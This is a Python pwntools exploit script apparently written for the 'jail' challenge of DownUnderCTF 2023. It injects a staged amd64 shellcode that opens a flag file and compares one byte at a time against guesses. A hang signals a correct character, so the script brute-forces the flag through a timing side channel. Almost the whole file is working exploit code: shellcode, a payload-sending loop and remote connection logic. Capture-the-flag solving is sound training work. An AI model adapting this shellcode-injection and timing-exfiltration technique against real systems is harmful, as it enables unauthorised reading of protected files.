#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2023.ductf.dev --port 30010 jail
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('jail')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2023.ductf.dev'
port = int(args.PORT or 30010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

flag_path = b"/chal/flag.txt\x00" if not args.LOCAL else b"/home/skuuk/du23/flag\x00"

extender = asm('''xor rax, rax
xor rdi, rdi
mov rsi, rdx
mov rdx, 0x1000
syscall
''')

def test_char(i,c):
    sc = asm(f'''xor rax, rax
xor rdi, rdi
mov rsi, rsp
mov rdx, 128
syscall

mov rax, SYS_openat
xor rdi, rdi
mov rsi, rsp
xor rdx, rdx
syscall

mov rbx, {i+1}
mov r10, rax
loop:
    dec rbx
    xor rax, rax
    mov rdi, r10
    mov rsi, rsp
    mov rdx, 1
    syscall
    mov rcx, 0
    cmp rbx,rcx
    jnz loop

mov r9,[rsi]
shl r9,56
shr r9,56
mov r8, {ord(c)}
cmp r8, r9
jnz stop

test eax, eax
stuck:
    jne stuck

stop:
    mov rax, SYS_exit
    syscall
''')
    return sc

import string

s = ''
c = 'a'
i = 18
t = Timeout()
while c != '}':
    for ch in string.printable:
        io = start()
        io.sendline(extender)
        io.sendline(len(extender)*b"p" + test_char(i,ch))
        input() if args.GDB else sleep(0.1)
        io.sendline(flag_path)
        if not args.GDB :
            with t.countdown(5):
                io.recvall(timeout=6)
                if t.timeout <= 0:
                    c = ch
                    s += c
                    i += 1
                    log.info(s)
                    break
        else:
            io.interactive()
            c = '}'
            break


